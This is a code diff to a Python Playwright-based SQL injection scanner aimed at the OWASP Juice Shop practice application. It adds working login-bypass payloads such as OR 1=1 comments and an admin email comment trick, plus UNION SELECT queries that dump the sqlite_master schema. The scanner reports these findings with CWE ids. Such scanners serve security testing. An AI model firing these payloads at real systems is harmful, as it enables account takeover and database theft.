@@ -557,68 +557,113 @@ class PlaywrightSQLiScanner(BaseScanner):
         vulnerabilities = []
         db_info = DatabaseInfo(db_type=DatabaseType.SQLITE)
         
+        self._log(f"[*] Juice Shop SQLi scan starting for {base_url}")
+        
         # ═══════════════════════════════════════════════════════════════
-        # Test 1: Login Authentication Bypass
+        # Test 1: Login Authentication Bypass (MAIN VULNERABILITY)
         # ═══════════════════════════════════════════════════════════════
         self._log("[*] Testing Juice Shop login bypass...")
         
         login_url = f"{base_url}/rest/user/login"
         
-        for bypass in self._get_auth_bypass_payloads():
-            if "juiceshop" in bypass["type"] or bypass["type"] in ["admin_comment", "or_true", "comment_bypass"]:
+        # Juice Shop specific payloads that WORK
+        juice_shop_login_payloads = [
+            {"email": "' OR 1=1--", "password": "a", "type": "or_1_1"},
+            {"email": "' OR 1=1;--", "password": "a", "type": "or_1_1_semicolon"},
+            {"email": "'--", "password": "a", "type": "comment_only"},
+            {"email": "admin@juice-sh.op'--", "password": "a", "type": "admin_comment"},
+            {"email": "' OR '1'='1'--", "password": "a", "type": "or_string"},
+            {"email": "' OR 1=1/*", "password": "a", "type": "block_comment"},
+            {"email": "admin'--", "password": "", "type": "admin_simple"},
+            {"email": "' OR true--", "password": "", "type": "or_true"},
+            {"email": "') OR 1=1--", "password": "", "type": "paren_or"},
+        ]
+        
+        # Create a single page for all login tests
+        page = await self._context.new_page()
+        
+        try:
+            # Navigate to the site first to set up cookies/context
+            self._log(f"    Navigating to {base_url}...")
+            try:
+                await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
+                await page.wait_for_timeout(1000)
+                self._log(f"    Connected to Juice Shop")
+            except Exception as e:
+                self._log(f"    Warning: Initial navigation issue: {str(e)[:50]}")
+            
+            for payload in juice_shop_login_payloads:
                 try:
-                    page = await self._context.new_page()
-                    
-                    # Capture the request/response
+                    # Capture HTTP message
                     http_msg = HTTPMessage()
                     http_msg.method = "POST"
                     http_msg.url = login_url
                     http_msg.request_headers = {"Content-Type": "application/json"}
-                    http_msg.request_body = json.dumps({
-                        "email": bypass['username'],
-                        "password": bypass['password']
-                    })
+                    request_body = {"email": payload['email'], "password": payload['password']}
+                    http_msg.request_body = json.dumps(request_body)
                     
                     start_time = time.time()
                     
-                    # Make login request via page.evaluate
-                    login_result = await page.evaluate(f'''
-                        async () => {{
-                            try {{
-                                const response = await fetch("{login_url}", {{
+                    # FIXED: Pass arguments as a single dictionary
+                    login_result = await page.evaluate('''
+                        async (args) => {
+                            try {
+                                const response = await fetch(args.loginUrl, {
                                     method: "POST",
-                                    headers: {{"Content-Type": "application/json"}},
-                                    body: JSON.stringify({{
-                                        email: `{bypass['username']}`,
-                                        password: `{bypass['password']}`
-                                    }})
-                                }});
+                                    headers: {
+                                        "Content-Type": "application/json"
+                                    },
+                                    body: JSON.stringify({
+                                        email: args.email,
+                                        password: args.password
+                                    })
+                                });
+                                
                                 const text = await response.text();
-                                let data = {{}};
-                                try {{ data = JSON.parse(text); }} catch(e) {{}}
-                                return {{
+                                let data = {};
+                                try { 
+                                    data = JSON.parse(text); 
+                                } catch(e) {}
+                                
+                                return {
                                     status: response.status,
+                                    statusText: response.statusText,
                                     body: text,
                                     data: data,
-                                    success: response.status === 200 && data.authentication
-                                }};
-                            }} catch(e) {{
-                                return {{error: e.toString()}};
-                            }}
-                        }}
-                    ''')
+                                    hasAuth: !!(data && data.authentication),
+                                    hasToken: !!(data && data.authentication && data.authentication.token)
+                                };
+                            } catch(e) {
+                                return {
+                                    error: e.toString(),
+                                    status: 0
+                                };
+                            }
+                        }
+                    ''', {
+                        "loginUrl": login_url,
+                        "email": payload['email'],
+                        "password": payload['password']
+                    })
                     
                     http_msg.response_time_ms = (time.time() - start_time) * 1000
-                    
-                    await page.close()
                     
                     if login_result:
                         http_msg.status_code = login_result.get("status", 0)
                         http_msg.response_body = login_result.get("body", "")
                         
-                        if login_result.get("success"):
-                            self._log(f"  [+] AUTH BYPASS FOUND: {bypass['type']}")
-                            self._log(f"      Payload: {bypass['username']}")
+                        self._log(f"    Payload: {payload['email'][:30]:30} | Status: {login_result.get('status')} | Auth: {login_result.get('hasAuth')}")
+                        
+                        # Check for successful authentication bypass
+                        if login_result.get("hasAuth") or login_result.get("hasToken"):
+                            self._log(f"  [+] AUTH BYPASS FOUND: {payload['type']}")
+                            self._log(f"      Payload: {payload['email']}")
+                            
+                            # Extract user info if available
+                            user_info = ""
+                            if login_result.get("data", {}).get("authentication"):
+                                auth_data = login_result["data"]["authentication"]
+                                user_info = f"Token received. User: {auth_data.get('umail', 'unknown')}"
                             
                             vuln = self.create_vulnerability(
                                 http_capture=http_msg,
@@ -626,85 +671,303 @@ class PlaywrightSQLiScanner(BaseScanner):
                                 severity=Severity.CRITICAL,
                                 url=login_url,
                                 parameter="email",
-                                payload=bypass['username'],
-                                evidence=f"Login successful with SQLi payload. User data: {login_result.get('data', {})}",
-                                description="Authentication bypass via SQL injection in login form. An attacker can log in as any user without knowing their password.",
+                                payload=payload['email'],
+                                evidence=f"Login successful with SQLi payload. {user_info}. Response: {http_msg.response_body[:200]}",
+                                description="Critical authentication bypass via SQL injection in login form. An attacker can log in as any user (including admin) without knowing their password.",
                                 cwe_id="CWE-89",
                                 cvss_score=9.8,
                                 remediation=self._get_remediation(),
                                 references=self._get_references()
                             )
                             vulnerabilities.append(vuln)
-                            break
+                            break  # Found one, that's enough
                         
+                        # Check for SQL errors in response
+                        response_body = login_result.get("body", "").lower()
+                        if any(err in response_body for err in ["sqlite", "sql", "syntax error", "near", "unrecognized token"]):
+                            self._log(f"  [+] SQL ERROR DETECTED: {payload['type']}")
+                            
+                            vuln = self.create_vulnerability(
+                                http_capture=http_msg,
+                                vuln_type="SQL Injection (Error-based)",
+                                severity=Severity.HIGH,
+                                url=login_url,
+                                parameter="email",
+                                payload=payload['email'],
+                                evidence=f"SQL error in response: {http_msg.response_body[:300]}",
+                                description="SQL error messages indicate SQL injection vulnerability in login form.",
+                                cwe_id="CWE-89",
+                                cvss_score=8.6,
+                                remediation=self._get_remediation(),
+                                references=self._get_references()
+                            )
+                            vulnerabilities.append(vuln)
+                            
                 except Exception as e:
-                    self._log(f"  [!] Error testing login: {e}")
+                    self._log(f"    Error with payload {payload['type']}: {str(e)[:50]}")
                     continue
                 
-                await asyncio.sleep(0.3)
+                await asyncio.sleep(0.2)
+        
+        except Exception as e:
+            self._log(f"  [!] Login test error: {e}")
+        finally:
+            await page.close()
         
         # ═══════════════════════════════════════════════════════════════
-        # Test 2: Product Search SQLi
+        # Test 2: Product Search SQLi (using fetch, not page.goto)
         # ═══════════════════════════════════════════════════════════════
         self._log("[*] Testing Juice Shop product search...")
         
         search_url = f"{base_url}/rest/products/search"
         
-        error_payloads = [
-            "test'",
-            "test' OR '1'='1",
-            "test' UNION SELECT NULL--",
-            "test')) OR 1=1--",
-            "test' OR 1=1;--",
-            "')) UNION SELECT sql FROM sqlite_master--",
+        search_payloads = [
+            ("test'", "single_quote"),
+            ("test'))--", "double_paren_comment"),
+            ("test' OR '1'='1", "or_true"),
+            ("test')) UNION SELECT 1,2,3,4,5,6,7,8,9--", "union_9_cols"),
+            ("test')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--", "union_sqlite_master"),
+            ("')) OR 1=1--", "paren_or"),
         ]
         
-        for payload in error_payloads:
-            try:
-                page = await self._context.new_page()
-                test_url = f"{search_url}?q={quote(payload)}"
-                
-                http_msg = HTTPMessage()
-                http_msg.method = "GET"
-                http_msg.url = test_url
-                
-                start_time = time.time()
-                response = await page.goto(test_url, wait_until='networkidle', timeout=10000)
-                http_msg.response_time_ms = (time.time() - start_time) * 1000
-                
-                content = await page.content()
-                http_msg.response_body = content
-                http_msg.status_code = response.status if response else 0
-                
-                await page.close()
-                
-                sqli_result = self._detect_sqli_in_response(content, response.status if response else 0)
-                sqli_result.http_message = http_msg
-                
-                if sqli_result.vulnerable:
-                    self._log(f"  [+] SQLi FOUND in search: {sqli_result.injection_type}")
-                    
-                    vuln = self.create_vulnerability(
-                        http_capture=http_msg,
-                        vuln_type=f"SQL Injection ({sqli_result.injection_type})",
-                        severity=Severity.HIGH,
-                        url=search_url,
-                        parameter="q",
-                        payload=payload,
-                        evidence=sqli_result.evidence,
-                        description="SQL injection in product search allows attackers to extract database contents.",
-                        cwe_id="CWE-89",
-                        cvss_score=8.6,
-                        remediation=self._get_remediation(),
-                        references=self._get_references()
-                    )
-                    vulnerabilities.append(vuln)
-                    break
-                    
-            except Exception as e:
-                continue
+        page = await self._context.new_page()
+        
+        try:
+            # Navigate to base URL first
+            await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
+            await page.wait_for_timeout(500)
             
-            await asyncio.sleep(0.3)
+            for payload, payload_type in search_payloads:
+                try:
+                    self._log(f"    Testing: {payload[:30]}...")
+                    
+                    http_msg = HTTPMessage()
+                    http_msg.method = "GET"
+                    http_msg.url = f"{search_url}?q={quote(payload)}"
+                    
+                    start_time = time.time()
+                    
+                    # FIXED: Use fetch via evaluate instead of page.goto for API calls
+                    search_result = await page.evaluate('''
+                        async (args) => {
+                            try {
+                                const response = await fetch(args.searchUrl + "?q=" + encodeURIComponent(args.payload));
+                                const text = await response.text();
+                                
+                                return {
+                                    status: response.status,
+                                    body: text,
+                                    length: text.length
+                                };
+                            } catch(e) {
+                                return {
+                                    error: e.toString(),
+                                    status: 0
+                                };
+                            }
+                        }
+                    ''', {
+                        "searchUrl": search_url,
+                        "payload": payload
+                    })
+                    
+                    http_msg.response_time_ms = (time.time() - start_time) * 1000
+                    
+                    if search_result.get("error"):
+                        self._log(f"      Error: {search_result['error'][:50]}")
+                        continue
+                    
+                    http_msg.status_code = search_result.get("status", 0)
+                    http_msg.response_body = search_result.get("body", "")[:5000]
+                    
+                    content = search_result.get("body", "")
+                    content_lower = content.lower()
+                    
+                    # Check for SQL errors
+                    sql_error_indicators = [
+                        "sqlite_error",
+                        "sqlite3",
+                        "sql error",
+                        "syntax error",
+                        "near \"",
+                        "unrecognized token",
+                        "no such column",
+                        "no such table",
+                    ]
+                    
+                    for indicator in sql_error_indicators:
+                        if indicator in content_lower:
+                            self._log(f"  [+] SQLi FOUND in search: {payload_type} (indicator: {indicator})")
+                            
+                            vuln = self.create_vulnerability(
+                                http_capture=http_msg,
+                                vuln_type="SQL Injection (Error-based)",
+                                severity=Severity.HIGH,
+                                url=search_url,
+                                parameter="q",
+                                payload=payload,
+                                evidence=f"SQL error detected: '{indicator}' in response.",
+                                description="SQL injection in product search allows attackers to extract database contents.",
+                                cwe_id="CWE-89",
+                                cvss_score=8.6,
+                                remediation=self._get_remediation(),
+                                references=self._get_references()
+                            )
+                            vulnerabilities.append(vuln)
+                            break
+                    
+                    # Check for UNION-based data extraction success
+                    if "sqlite_master" in payload.lower():
+                        if "CREATE TABLE" in content or "create table" in content_lower:
+                            self._log(f"  [+] UNION SQLi data extraction successful!")
+                            
+                            vuln = self.create_vulnerability(
+                                http_capture=http_msg,
+                                vuln_type="SQL Injection (UNION-based Data Extraction)",
+                                severity=Severity.CRITICAL,
+                                url=search_url,
+                                parameter="q",
+                                payload=payload,
+                                evidence=f"Database schema extracted: {content[:500]}",
+                                description="UNION-based SQL injection allows full database extraction.",
+                                cwe_id="CWE-89",
+                                cvss_score=9.8,
+                                remediation=self._get_remediation(),
+                                references=self._get_references()
+                            )
+                            vulnerabilities.append(vuln)
+                            
+                except Exception as e:
+                    self._log(f"      Error: {str(e)[:50]}")
+                    continue
+                
+                await asyncio.sleep(0.2)
+                
+        except Exception as e:
+            self._log(f"  [!] Search test error: {e}")
+        finally:
+            await page.close()
+        
+        # ═══════════════════════════════════════════════════════════════
+        # Test 3: Comprehensive API Testing
+        # ═══════════════════════════════════════════════════════════════
+        self._log("[*] Testing Juice Shop APIs directly...")
+        
+        page = await self._context.new_page()
+        
+        try:
+            await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
+            await page.wait_for_timeout(500)
+            
+            # FIXED: Pass baseUrl as a single argument
+            api_test_result = await page.evaluate('''
+                async (baseUrl) => {
+                    const results = [];
+                    
+                    // Test 1: Login with SQLi
+                    const loginPayloads = [
+                        {"email": "' OR 1=1--", "password": "x"},
+                        {"email": "admin@juice-sh.op'--", "password": "x"},
+                        {"email": "' OR true--", "password": "x"},
+                    ];
+                    
+                    for (const payload of loginPayloads) {
+                        try {
+                            const response = await fetch(baseUrl + "/rest/user/login", {
+                                method: "POST",
+                                headers: {"Content-Type": "application/json"},
+                                body: JSON.stringify(payload)
+                            });
+                            const text = await response.text();
+                            let json = null;
+                            try { json = JSON.parse(text); } catch(e) {}
+                            
+                            results.push({
+                                endpoint: "login",
+                                payload: payload.email,
+                                status: response.status,
+                                body: text.substring(0, 500),
+                                hasAuth: !!(json && json.authentication),
+                                hasToken: !!(json && json.authentication && json.authentication.token)
+                            });
+                        } catch(e) {
+                            results.push({
+                                endpoint: "login",
+                                payload: payload.email,
+                                error: e.toString()
+                            });
+                        }
+                    }
+                    
+                    // Test 2: Search with SQLi
+                    const searchPayloads = ["test'", "test'))--", "'))OR 1=1--"];
+                    
+                    for (const payload of searchPayloads) {
+                        try {
+                            const response = await fetch(baseUrl + "/rest/products/search?q=" + encodeURIComponent(payload));
+                            const text = await response.text();
+                            
+                            results.push({
+                                endpoint: "search",
+                                payload: payload,
+                                status: response.status,
+                                body: text.substring(0, 500),
+                                hasError: text.toLowerCase().includes("error") || text.toLowerCase().includes("sqlite")
+                            });
+                        } catch(e) {
+                            results.push({
+                                endpoint: "search",
+                                payload: payload,
+                                error: e.toString()
+                            });
+                        }
+                    }
+                    
+                    return results;
+                }
+            ''', base_url)  # Single argument here
+            
+            if api_test_result:
+                for result in api_test_result:
+                    self._log(f"    {result.get('endpoint')}: {result.get('payload', '')[:20]} -> Status: {result.get('status')} | Auth: {result.get('hasAuth')} | Error: {result.get('hasError')}")
+                    
+                    # Check for successful SQLi
+                    if result.get('hasAuth') or result.get('hasToken'):
+                        self._log(f"  [+] CONFIRMED AUTH BYPASS via {result.get('endpoint')}")
+                        
+                        http_msg = HTTPMessage()
+                        http_msg.method = "POST"
+                        http_msg.url = f"{base_url}/rest/user/login"
+                        http_msg.response_body = result.get('body', '')
+                        http_msg.status_code = result.get('status', 200)
+                        
+                        # Avoid duplicate
+                        if not any(v.payload == result.get('payload') for v in vulnerabilities):
+                            vuln = self.create_vulnerability(
+                                http_capture=http_msg,
+                                vuln_type="SQL Injection (Authentication Bypass)",
+                                severity=Severity.CRITICAL,
+                                url=f"{base_url}/rest/user/login",
+                                parameter="email",
+                                payload=result.get('payload', ''),
+                                evidence=f"Authentication bypassed. Response: {result.get('body', '')[:200]}",
+                                description="Critical authentication bypass via SQL injection.",
+                                cwe_id="CWE-89",
+                                cvss_score=9.8,
+                                remediation=self._get_remediation(),
+                                references=self._get_references()
+                            )
+                            vulnerabilities.append(vuln)
+                    
+                    if result.get('hasError') and result.get('endpoint') == 'search':
+                        self._log(f"  [+] SQL ERROR in search endpoint")
+            
+        except Exception as e:
+            self._log(f"  [!] API test error: {e}")
+        finally:
+            await page.close()
+        
+        self._log(f"[*] Juice Shop scan complete. Found {len(vulnerabilities)} SQLi vulnerabilities")
         
         return vulnerabilities, db_info
     
